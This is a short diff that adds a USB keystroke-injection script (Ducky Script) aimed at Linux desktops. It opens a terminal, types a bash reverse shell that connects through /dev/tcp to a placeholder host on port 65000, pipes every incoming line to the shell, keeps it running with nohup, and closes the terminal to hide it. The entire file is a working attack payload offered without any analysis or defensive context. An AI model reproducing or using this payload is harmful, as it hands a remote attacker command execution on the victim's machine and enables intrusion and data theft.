@@ -1,0 +1,9 @@
+DELAY 500
+CTRL-ALT t
+DELAY 300
+STRING exec 5<>/dev/tcp/X.X.X.X/65000
+ENTER
+STRING nohup cat <&5 | while read line; do $line 2>&5 >&5; done & 
+ENTER
+STRING exit
+ENTER
